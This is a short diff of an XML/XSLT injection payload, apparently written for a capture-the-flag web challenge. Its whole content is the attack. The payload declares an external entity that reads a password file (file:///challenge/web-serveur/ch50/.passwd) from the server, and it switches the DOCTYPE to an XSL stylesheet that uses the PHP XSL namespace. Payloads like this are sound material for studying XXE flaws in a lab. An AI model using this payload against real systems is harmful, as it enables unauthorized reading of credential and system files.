@@ -1,6 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [
-    <!ELEMENT title ANY >
+<!DOCTYPE xsl:stylesheet [
     <!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch50/.passwd" >
 ]>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
